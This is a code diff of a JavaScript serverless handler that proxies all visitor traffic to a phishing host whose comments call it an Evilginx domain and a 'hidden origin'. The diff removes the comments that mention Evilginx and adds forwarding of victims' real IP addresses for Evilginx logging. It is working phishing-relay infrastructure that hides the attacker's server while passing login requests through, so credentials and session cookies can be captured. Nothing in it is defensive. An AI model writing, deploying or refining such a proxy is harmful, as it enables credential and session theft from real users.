@@ -1,20 +1,21 @@
 export default async function handler(req, res) {
-  // Define your Evilginx Domain 1 URL (hidden origin)
   const targetUrl = `https://login.espeharete.top${req.url}`;
 
-  // Forward all headers (except 'host' to avoid conflicts)
-  const headers = { ...req.headers };
-  delete headers['host'];
+  // Clone headers and forward the real visitor IP
+  const headers = { 
+    ...req.headers,
+    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip, // Forward real IP
+    'X-Real-IP': req.headers['x-real-ip'] || req.ip, // For Evilginx logging
+  };
+  delete headers['host']; // Avoid conflicts
 
   try {
-    // Fetch the Evilginx page and stream it back
     const response = await fetch(targetUrl, {
       method: req.method,
       headers: headers,
       body: req.method !== 'GET' ? req.body : undefined,
     });
 
-    // Forward the response
     const data = await response.text();
     res.status(response.status).send(data);
   } catch (error) {
